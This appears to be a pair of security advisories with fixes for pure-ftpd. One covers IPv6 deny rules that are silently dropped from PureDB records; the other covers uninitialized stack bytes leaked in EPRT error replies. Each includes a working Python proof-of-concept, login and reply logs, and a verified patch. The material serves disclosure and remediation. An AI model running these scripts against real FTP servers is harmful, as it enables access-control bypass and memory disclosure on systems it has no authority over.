title: PureDB IPv6 allow/deny IP rules are silently discarded, bypassing per-user deny lists
description: PureDB records are colon-separated and pure-pw writes per-user allow/deny IP patterns verbatim, while the daemon reads the fields positionally. An IPv6 address literal contains colons, so configuring one writes extra fields: the deny pattern is silently dropped and a client from the denied address still authenticates. The allow-list variant shifts a fragment into the time-restriction field, which denies every login and also drops the allow restriction.
impact: A per-user network restriction configured through the documented administrative interface is silently not enforced. Any client holding valid credentials for the account can authenticate from the address the administrator intended to deny - and, because the rule disappears rather than degrading, from any other address as well. For allow lists the account becomes unusable, denying the legitimate user while the address restriction is also lost. The 1.0.54 changelog states that IP access rules now support IPv6 patterns; that does not hold for IPv6 address literals.
poc_description:
1. Build the tree and use the in-tree `src/pure-pw` and `src/pure-ftpd`.
2. Create a virtual user whose client-IP deny list contains an IPv6 literal: `pure-pw useradd <login> -f <passwd> -u <uid> -g <gid> -d <home> -R '::1/128'`.
3. Create a control user with an IPv4 deny rule: `-R '127.0.0.1/32'`.
4. Inspect the generated password lines: the IPv6 record has extra fields (`...:::::1/128:`) and an empty deny column; the IPv4 record is well formed.
5. Build the database with `pure-pw mkdb <puredb> -f <passwd>` and start `pure-ftpd -S <port> -E -j -A -l puredb:<puredb>`.
6. Log in as the IPv6-denied user from the IPv6 loopback address: the server answers `230 OK`, so the deny rule is not enforced.
7. Log in as the IPv4-denied control user from the IPv4 loopback address: the server answers `530 Login authentication failed`, proving the deny mechanism itself works and only the IPv6 rule was dropped.
8. Log in as the user configured with `-r '::1/128'` (allow list): the server answers `530` because the shifted fragment became an unparsable time restriction.
poc_script_code:
#!/usr/bin/env python3
"""PureDB IPv6 allow/deny rules are silently discarded.
Run from the repository root as root after building src/pure-pw and src/pure-ftpd."""
import os, socket, subprocess, time

PURE_PW, PURE_FTPD = "./src/pure-pw", "./src/pure-ftpd"
WORK = "/var/tmp/pf-iprule-poc"
PASSWD, DB = WORK + "/passwd", WORK + "/puredb"
HOME, PORT, UID, PW = "/var/ftproot/user", 2121, 1000, "changeme"

def add_user(login, extra):
    r = subprocess.run([PURE_PW, "useradd", login, "-f", PASSWD, "-u", str(UID),
                        "-g", str(UID), "-d", HOME] + extra,
                       input=(PW + "\n" + PW + "\n").encode(), capture_output=True)
    print("useradd %-8s %-18s rc=%d" % (login, " ".join(extra), r.returncode))

def login(host, user):
    s = socket.create_connection((host, PORT), timeout=10); s.settimeout(10)
    def rd():
        try: return s.recv(65535).decode("latin1")
        except Exception: return ""
    rd(); s.sendall(b"USER " + user.encode() + b"\r\n"); rd()
    s.sendall(b"PASS " + PW.encode() + b"\r\n"); r = rd(); s.close()
    return r.strip().splitlines()[0] if r else "<none>"

os.makedirs(WORK, exist_ok=True)
add_user("v6deny", ["-R", "::1/128"])        # documented IPv6 deny rule
add_user("v4deny", ["-R", "127.0.0.1/32"])   # control
add_user("v6allow", ["-r", "::1/128"])       # allow-list variant
print("--- password records ---")
for line in open(PASSWD):
    print(line.rstrip())
subprocess.run([PURE_PW, "mkdb", DB, "-f", PASSWD]); os.chmod(DB, 0o644)
d = subprocess.Popen([PURE_FTPD, "-S", str(PORT), "-E", "-j", "-A", "-l", "puredb:" + DB])
time.sleep(2)
try:
    print("::1       v6deny  ->", login("::1", "v6deny"))     # 530 expected, 230 observed
    print("::1       v6allow ->", login("::1", "v6allow"))
    print("127.0.0.1 v4deny  ->", login("127.0.0.1", "v4deny"))
finally:
    d.terminate(); d.wait()
remediation_steps: Validate the four IP-pattern fields when the record is written so a value containing the record separator is rejected with a clear error instead of corrupting the record, and make the daemon treat a record with more fields than the format defines as invalid so any corrupted or hand-edited entry fails authentication rather than dropping its restrictions. Longer term, add an escape encoding for the field separator to the PureDB record format (writer and reader together, with a version marker) so IPv6 literals can be stored and evaluated, and document hostname rules as the supported way to express IPv6 restrictions in the meantime. Operators that already configured IPv6 literals should re-check affected accounts with pure-pw show and migrate to hostname rules.
evidence:
Record produced by the documented administrative CLI (values generic):

```text
$ pure-pw useradd v6deny -f passwd -u 1000 -g 1000 -d /home/v6deny -R '::1/128'
v6deny:<hash>:1000:1000::/home/v6deny/./:::::::::::::1/128:
v4deny:<hash>:1000:1000::/home/v4deny/./:::::::::::127.0.0.1/32:
```

Field positions read by the daemon (13 allow-local, 14 deny-local, 15 allow-client, 16 deny-client, 17 time):

```text
v6deny  fields=20 allowR='' denyR='' time=''        <-- deny rule gone
v4deny  fields=18 allowR='' denyR='127.0.0.1/32' time=''
v6allow fields=20 allowR='' denyR='' time='1/128'   <-- account unusable
```

pure-pw show confirms the empty deny list for the IPv6 user:

```text
Denied  client IPs :
Time restrictions  : 0000-0000 (unlimited)
```

Live logins against a daemon loaded with that database:

```text
client=::1        user=v6deny   -> LOGIN OK  230 OK. Current directory is /
client=::1        user=v6allow  -> DENIED    530 Login authentication failed
client=127.0.0.1  user=v4deny   -> DENIED    530 Login authentication failed   (control)
client=127.0.0.1  user=v6deny   -> LOGIN OK  230 OK. Current directory is /
```

After the fix, with the same corrupted database still in place:

```text
client=::1        user=v6deny      -> DENIED   530 Login authentication failed
client=::1        user=v6allow     -> DENIED   530 Login authentication failed
client=::1        user=permissive  -> LOGIN OK 230 OK. Current directory is /
client=127.0.0.1  user=permissive  -> LOGIN OK 230 OK. Current directory is /
client=127.0.0.1  user=v4deny      -> DENIED   530 Login authentication failed
```

And the patched CLI refuses to create the broken record:

```text
IP access rules cannot contain the ':' field separator;
use a hostname rule for IPv6 clients instead of an address literal.
Unable to append a line
```
assumptions: The deployment uses the PureDB virtual-user backend and the administrator expresses a per-user network restriction with an IPv6 address literal through pure-pw (-i/-I/-r/-R). The attacker holds valid credentials for the restricted account and can reach the service from the address that was meant to be denied. IPv6 hostname rules (patterns without a colon) are unaffected and are evaluated correctly.
counterevidence: The IPv6 matcher itself is correct and reachable through hostname rules (verified: -R localhost blocks both 127.0.0.1 and ::1), so this is not a general failure of IPv6 support. IPv4 rules are enforced correctly in the same test (control: -R 127.0.0.1/32 denies 127.0.0.1), and a well-formed record with no rules authenticates normally, so the defect is specific to address literals surviving the positional record format. Exploitation requires a non-default configuration step (an IPv6 literal rule rather than a hostname or IPv4 rule) plus valid credentials for the restricted account, which is why attack complexity is rated High. No path was found by which an unauthenticated client benefits.
severity_change_conditions: If the accounts protected by such IPv6 rules are administrative or the rule is the only control restricting them, the demonstrated loss of confidentiality becomes High (base 5.9); if no deployment configures IPv6 address literals, the practical impact is limited to a silent configuration error.
endpoint: src/pure-pw.c (record writer) -> src/log_puredb.c (record reader and rule evaluation)

code_locations.label: Daemon: reject records that still have fields after the last defined column (fail closed)
pure-pw: refuse to write an IP rule containing the field separator

fix_verification:
Applied both changes to a copy of the tree and rebuilt: `make -j4` and `make check` both exit 0 with no new compiler warnings; the fix_before blocks were dumped with line numbers to confirm they match the file character-for-character.

Security closure: re-ran the proof of concept against the patched daemon with the same corrupted database that previously allowed the login. The IPv6-denied user from `::1` now answers `530 Login authentication failed` (was `230 OK`); the allow-list user still answers `530`; the IPv4 deny control still answers `530`.

Bypass review: the daemon-side check is a single "no fields remain after the last column" test inside the one parse function used by every PureDB login, so it catches corruption introduced through any field (client IP, local IP, home, gecos) and any number of extra separators, not only the literal used in the proof of concept. Records that end before the IP columns still take the pre-existing early-return path, and well-formed 18-field records still authenticate (verified with a permissive user). Patched `pure-pw` rejects any of the four patterns containing `:` and writes nothing, while IPv4 and hostname patterns are written unchanged.

Preserved behaviour: permissive logins from `127.0.0.1` and `::1` still succeed, IPv4 deny rules are still enforced, and a rejected write leaves the password file untouched.

Gaps: no exhaustive corpus of historical record shapes was executed (legacy short records were reasoned from the code plus the permissive-record test), and the complete escape-encoding fix was described but not implemented. Verification ran on a copy of the source tree; the same steps apply to the live tree.
fix_pr_body:
## Stop silently discarding PureDB allow/deny IP rules

PureDB records are `:`-separated and `pure-pw` writes IP patterns verbatim while `pw_puredb_parseline()` reads columns positionally. An IPv6 literal contains `:`, so `pure-pw useradd <user> -R '::1/128'` writes two extra fields, the deny column becomes empty and the rule is silently dropped; a client from the denied address still logs in.

Fix:

1. `src/log_puredb.c` - reject a record that still has fields after the last defined column, so any corrupted record fails authentication (fail closed). Well-formed 18-field records and legacy short records are unaffected.
2. `src/pure-pw.c` - refuse to write a rule containing the field separator and print an explicit error, instead of silently producing a broken account.

Verified on a copy of the tree: `make` and `make check` pass; with the corrupted database the IPv6-denied user is now rejected (530) where it previously logged in (230); a permissive user still logs in from both `::1` and `127.0.0.1`; the IPv4 deny control is unchanged; patched `pure-pw` rejects the IPv6 pattern and still writes IPv4 rules. A complete long-term fix should add an escape encoding for the separator to the record format.

title: Uninitialized stack memory disclosed in EPRT IPv6 error reply
description: The IPv6 branch of the EPRT parser builds a struct sockaddr_storage on the stack and fills only the address family and the 16 address bytes, leaving sin6_scope_id uninitialized. When the supplied address differs from the control connection's peer, the structure is passed to getnameinfo(NI_NUMERICHOST), which appends `%<sin6_scope_id>` to the formatted address and returns uninitialized stack memory to the client in the 500 reply. An authenticated client can read four bytes of process stack per request, and the value changes with the commands executed earlier in the session.
impact: An authenticated client can read four bytes of uninitialized process stack per request through the EPRT error reply, and can influence which stale values are disclosed by the commands it issues first. This is a memory-disclosure primitive that can expose residual process data (including address/layout fragments useful for defeating ASLR in a follow-on exploit); in the tested build the disclosed word contained no directly sensitive value.
poc_description:
1. Build the tree and start `pure-ftpd` locally with a virtual user (for example `pure-ftpd -S <port> -E -j -A -l puredb:<db>`).
2. Connect and authenticate (`USER`/`PASS`).
3. Send `EPRT |2|2001:db8::1|1025|` - an IPv6 address that differs from the peer address.
4. Observe the `500 I won't open a connection to 2001:db8::1%3724148534 (only to 127.0.0.1)` reply: the `%3724148534` suffix is the uninitialized `sin6_scope_id` (0xddf9ff36).
5. Repeat on a fresh connection without any prior command: the same word is returned. Send a long command first (for example `TYPE` followed by a 4000-byte argument) and repeat the EPRT: the disclosed word changes (0x82e29900), proving it is stale stack content that the client can shape.
6. Submit a very long EPRT and repeat the same correction, and the value can be sampled across a session; the fix removes the suffix entirely, returning the plain address.
poc_script_code:
#!/usr/bin/env python3
"""Read uninitialized stack memory through the IPv6 EPRT error reply."""
import re, socket, sys

HOST, PORT = "127.0.0.1", int(sys.argv[1]) if len(sys.argv) > 1 else 2121
USER, PW = "user", "password"

def sample(shape=None):
    s = socket.create_connection((HOST, PORT), timeout=10)
    s.settimeout(10)
    def rd():
        try:
            return s.recv(65535).decode("latin1")
        except Exception:
            return ""
    rd()
    s.sendall(b"USER " + USER.encode() + b"\r\n"); rd()
    s.sendall(b"PASS " + PW.encode() + b"\r\n"); rd()
    if shape:
        s.sendall(shape + b"\r\n"); rd()
    s.sendall(b"EPRT |2|2001:db8::1|1025|\r\n")
    reply = rd()
    s.close()
    m = re.search(r"to (\S+)", reply)
    return reply.strip(), m.group(1) if m else None

print("clean session :", sample())
print("after TYPE    :", sample(b"TYPE " + b"A" * 4000))
remediation_steps: Zero the sockaddr_storage before populating it, as the IPv4 EPRT and PORT paths already do, so no uninitialized fields can reach getnameinfo. More generally, initialize every stack sockaddr structure at declaration and consider passing an explicit length from a single construction helper so partially filled address structures cannot be formatted or compared.
evidence:
Requests against the unmodified build (authenticated session, IPv6 EPRT address different from the peer):

```text
EPRT |2|2001:db8::1|1025|              -> 500 I won't open a connection to 2001:db8::1%3724148534 (only to 127.0.0.1)
EPRT |2|::1|1025|                      -> 500 I won't open a connection to ::1%3724148534 (only to 127.0.0.1)
EPRT |2|fe80::1|1025|                  -> 500 I won't open a connection to fe80::1%3724148534 (only to 127.0.0.1)
```

The suffix is 0xddf9ff36, the uninitialized sin6_scope_id. It changes when the session executes other commands first, showing that it is stale stack content rather than a fixed constant:

```text
(no prior command)                     -> 2001:db8::1%3724148534   (0xddf9ff36)
after TYPE <4000-byte argument>        -> 2001:db8::1%2195888384   (0x82e29900)
after SITE CHMOD 777 <long name>       -> ::1%2195888384           (0x82e29900)
```

Same request against the patched build (memset added before generic_aton):

```text
EPRT |2|2001:db8::1|1025|  -> 500 I won't open a connection to 2001:db8::1 (only to 127.0.0.1)
EPRT |2|::1|1025|          -> 500 I won't open a connection to ::1 (only to 127.0.0.1)
EPRT |2|fe80::1|1025|      -> 500 I won't open a connection to fe80::1 (only to 127.0.0.1)
```

Legitimate behaviour after the fix (unchanged):

```text
EPRT |1|127.0.0.1|1024|  -> 200 PORT command successful
EPRT |2|::1|1024|        -> 200 PORT command successful   (from an ::1 client)
PORT 127,0,0,1,4,1       -> 200 PORT command successful
PASV                     -> 227 Entering Passive Mode (...)
```
assumptions: The attacker can authenticate (any virtual or system user, including anonymous if enabled) and issue FTP commands; EPRT is offered on every supported build (FEAT advertises it). No non-default compile option is required.
counterevidence: The leak only occurs on the IPv6 EPRT error path when the supplied address differs from the control-connection peer (the normal FXP-rejection reply); when the address matches the peer no address is formatted and nothing leaks. In this build the disclosed word was constant for a given command sequence and contained no recognizable secret, so the demonstrated impact is limited to four bytes of process memory per request rather than a direct credential or pointer disclosure. The IPv4 EPRT and PORT paths zero the structure and are unaffected. Confirmed by running the same requests against a patched build, which returns a plain address.
severity_change_conditions: Evidence that the disclosed words contain ASLR-relevant pointers or other sensitive process data in a production build would raise this finding; if the build always zeroes the field in practice (for example due to a zeroed stack), it would drop to informational.
fix_verification:
Applied the one-line change to a copy of the tree and rebuilt (`make -j4`, `make check`; both exit 0, no new warnings). The fix_before block was dumped with line numbers to confirm it matches the file character-for-character.

Security closure: the same requests that previously returned `2001:db8::1%3724148534`, `::1%3724148534` and `fe80::1%3724148534` now return `2001:db8::1`, `::1` and `fe80::1`, including after the stack-shaping sequence (`TYPE` with a 4000-byte argument) that previously changed the disclosed word. The uninitialized read is gone because the whole structure is zeroed before it is populated.

Bypass review: both callers of `generic_aton()` were inspected. The IPv4 EPRT branch and `doport()` already `memset` the structure, and the remaining caller (the operator-only `-t` trusted-IP option at startup) only feeds `addrcmp()`, which compares address bytes and never formats the structure; it is not reachable by a client. Within `do_ipv6_port` the structure is used only for `doport3()` protocol selection, `addrcmp()` and `getnameinfo()`, all of which now see a fully defined structure.

Preserved behaviour: `EPRT |1|...` and `EPRT |2|...` still succeed for matching addresses, the FXP rejection reply still names both addresses, `PORT` and `PASV` are unchanged, and numeric formatting of normal addresses is identical.

Gaps: the check is behavioural (no MemorySanitizer run, since an MSan-instrumented build was not produced); verification ran on a copy of the source tree, and the same one-line change applies to the live tree.
fix_pr_body:
## Zero the sockaddr_storage used by the IPv6 EPRT parser

`do_ipv6_port()` declares `struct sockaddr_storage a;` on the stack and lets `generic_aton()` fill only `ss_family` and the 16 address bytes. `sin6_flowinfo` and `sin6_scope_id` stay uninitialized.

Every request whose address differs from the control-connection peer reaches the FXP-rejection reply, which formats the address with `getnameinfo(NI_NUMERICHOST)`. glibc appends `%<sin6_scope_id>` when the scope id is non-zero, so the 500 reply carries four bytes of stale stack memory (`... to 2001:db8::1%3724148534 ...`), and the value changes with earlier commands in the session.

Fix: `memset(&a, 0, sizeof a);` before `generic_aton()`, matching what the IPv4 EPRT branch and `doport()` already do. Verified: the scope suffix disappears, EPRT/PORT/PASV/EPSV behaviour for IPv4 and IPv6 is unchanged, and `make check` passes.

code_locations.label: Zero the stack address structure before populating it (the IPv4 EPRT path already does this)

update_history.reason: Add the concrete code location and the applyable, verified fix (memset of the address structure).
